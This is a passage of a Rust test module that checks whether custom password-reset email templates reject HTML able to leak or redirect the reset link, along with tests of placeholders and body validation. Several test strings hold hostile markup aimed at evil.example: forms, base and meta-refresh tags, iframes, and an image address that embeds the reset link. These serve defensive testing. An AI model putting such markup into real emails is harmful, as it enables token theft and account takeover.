        let glued = reset_with(
            Preference::Inherited,
            Preference::Inherited,
            Preference::Own(text("Reset: https://evil.example/r?{{ action_link }}")),
        );
        let in_subject = reset_with(
            Preference::Own(label("Your link {{ action_link }}")),
            Preference::Inherited,
            Preference::Inherited,
        );

        assert!(matches!(glued, Err(DomainError::Validation(_))));
        assert!(matches!(in_subject, Err(DomainError::Validation(_))));
    }

    fn reset_html(body: &str) -> Result<EmailTemplate, DomainError> {
        reset_with(
            Preference::Inherited,
            Preference::Own(html(body)),
            Preference::Inherited,
        )
    }

    /// A custom reset email rejects form tags both around an action link
    /// and in mixed case without a link.
    #[test]
    fn a_form_is_refused_in_a_custom_email() {
        for body in [
            "<form action='https://evil.example/'><p>{{ action_link }}</p></form>",
            "<FoRm action=https://evil.example/>x</fOrM>",
        ] {
            assert!(
                matches!(reset_html(body), Err(DomainError::Validation(_))),
                "{body:?} was accepted"
            );
        }
    }

    /// A textarea beside the action link makes a custom reset email invalid.
    #[test]
    fn a_textarea_is_refused_in_a_custom_email() {
        let result = reset_html("<p>{{ action_link }}</p><TEXTAREA name=l></textarea>");

        assert!(matches!(result, Err(DomainError::Validation(_))));
    }

    /// A hidden input beside the action link is rejected in a custom reset email.
    #[test]
    fn an_input_is_refused_in_a_custom_email() {
        let result = reset_html("<p>{{ action_link }}</p><Input type=hidden name=l>");

        assert!(matches!(result, Err(DomainError::Validation(_))));
    }

    /// A custom reset email rejects a button whose form action points
    /// to an external site.
    #[test]
    fn a_button_is_refused_in_a_custom_email() {
        let result = reset_html(
            "<p>{{ action_link }}</p><button formaction='https://evil.example/'>Go</button>",
        );

        assert!(matches!(result, Err(DomainError::Validation(_))));
    }

    /// A base tag pointing to an external site is rejected in a reset email.
    #[test]
    fn a_base_is_refused_in_a_custom_email() {
        let result = reset_html("<BASE href='https://evil.example/'><p>{{ action_link }}</p>");

        assert!(matches!(result, Err(DomainError::Validation(_))));
    }

    /// A reset email rejects a meta refresh pointing to an external site.
    #[test]
    fn a_meta_is_refused_in_a_custom_email() {
        let result = reset_html(
            "<meta http-equiv=refresh content='0;url=https://evil.example/'><p>{{ action_link }}</p>",
        );

        assert!(matches!(result, Err(DomainError::Validation(_))));
    }

    /// An iframe beside the action link is rejected in a custom reset email.
    #[test]
    fn an_iframe_is_refused_in_a_custom_email() {
        let result = reset_html("<p>{{ action_link }}</p><IFrame src='https://evil.example/'>");

        assert!(matches!(result, Err(DomainError::Validation(_))));
    }

    /// A custom email uses tags whose names only start like a refused one,
    /// such as `<b>` and `<i>`, and the word "form" in its text. It is
    /// accepted.
    #[test]
    fn tags_that_only_resemble_a_refused_one_are_accepted() {
        let result = reset_html("<p><b>Bold</b> <i>form</i> {{ action_link }}</p>");

        assert!(result.is_ok(), "{:?}", result.err());
    }

    /// A stored reset template containing a form is rejected as corrupt
    /// when reconstructed.
    #[test]
    fn a_stored_template_with_a_form_is_refused() {
        let stored = EmailTemplate::reconstitute(EmailTemplateRow {
            template_type: EmailTemplateType::PasswordReset,
            locale: TemplateLocale::Fallback,
            subject: Preference::Inherited,
            body_html: Preference::Own(html(
                "<form action='https://evil.example/'>{{ action_link }}</form>",
            )),
            body_text: Preference::Inherited,
        });

        assert!(crate::shared::model::row_check::refused_as_corrupt(&stored));
    }

    /// A reset email has the link in its own paragraph and on its own line
    /// in the text, followed by a full stop. It is accepted.
    #[test]
    fn the_link_may_stand_in_the_text_of_either_body() {
        let template = reset_with(
            Preference::Own(label("Reset your password")),
            Preference::Own(html(
                "<p>Hello {{ user_name }},</p><p>{{ action_link }}</p>",
            )),
            Preference::Own(text("Reset here:\n{{ action_link }}.")),
        );

        assert!(template.is_ok(), "{:?}", template.err());
    }

    /// A stored template that embeds its action link in an image address
    /// is rejected as corrupt during reconstitution.
    #[test]
    fn a_stored_template_hiding_the_link_in_an_address_is_refused() {
        let stored = EmailTemplate::reconstitute(EmailTemplateRow {
            template_type: EmailTemplateType::PasswordReset,
            locale: TemplateLocale::Fallback,
            subject: Preference::Inherited,
            body_html: Preference::Own(html("<img src='https://evil.example/{{ action_link }}'>")),
            body_text: Preference::Inherited,
        });

        assert!(crate::shared::model::row_check::refused_as_corrupt(&stored));
    }

    /// The placeholders a tenant may use in a reset email include
    /// `action_link` and leave out `action_url`, the bare address.
    #[test]
    fn a_custom_template_is_offered_the_finished_link_not_the_address() {
        let offered = EmailTemplateType::PasswordReset.custom_variables();

        assert!(offered.contains(&TemplateVariable::ActionLink));
        assert!(!offered.contains(&TemplateVariable::ActionUrl));
    }

    /// The verification, magic link and reset emails each offer at least one
    /// placeholder, and no key is blank. `UserName` and `ActionUrl` map to
    /// `user_name` and `action_url`.
    #[test]
    fn every_template_type_names_the_placeholders_it_can_fill() {
        for template_type in [
            EmailTemplateType::Verification,
            EmailTemplateType::MagicLink,
            EmailTemplateType::PasswordReset,
        ] {
            let variables = template_type.available_variables();
            assert!(
                !variables.is_empty(),
                "{template_type:?} must offer at least one placeholder"
            );
            assert!(variables.iter().all(|v| !v.key().is_empty()));
        }

        assert_eq!(TemplateVariable::UserName.key(), "user_name");
        assert_eq!(TemplateVariable::ActionUrl.key(), "action_url");
    }

    /// Someone asks to move Ann's account to their own address. The warning
    /// to her current address can carry the cancel link, the address asked
    /// for and where the request came from, on either plane, so she can
    /// stop it and see who asked.
    #[test]
    fn a_change_request_warning_carries_the_cancel_link_and_the_requester() {
        for template_type in [
            EmailTemplateType::EmailChangeRequested,
            EmailTemplateType::OrgEmailChangeRequested,
        ] {
            let variables = template_type.available_variables();
            for needed in [
                TemplateVariable::ActionUrl,
                TemplateVariable::UserEmail,
                TemplateVariable::IpAddress,
            ] {
                assert!(
                    variables.contains(&needed),
                    "{template_type:?} lacks {needed:?}"
                );
            }
        }
    }

    /// An HTML body of one paragraph is accepted.
    #[test]
    fn a_well_formed_email_html_body_is_accepted() {
        assert!(EmailHtmlBody::new("<p>Hello</p>").is_ok());
    }

    /// An empty HTML body is refused.
    #[test]
    fn a_malformed_email_html_body_is_refused() {
        assert!(EmailHtmlBody::new("").is_err());
    }

    /// A text body over several lines with mixed line endings is accepted.
    #[test]
    fn a_well_formed_email_text_body_is_accepted() {
        assert!(EmailTextBody::new("Hello,\n\nWelcome aboard.\r\n").is_ok());
    }

    /// An empty text body and one holding a NUL byte are both refused.
    #[test]
    fn a_malformed_email_text_body_is_refused() {
        for value in ["", "a\0b"] {
            assert!(EmailTextBody::new(value).is_err(), "{value:?} was accepted");
        }
    }
}
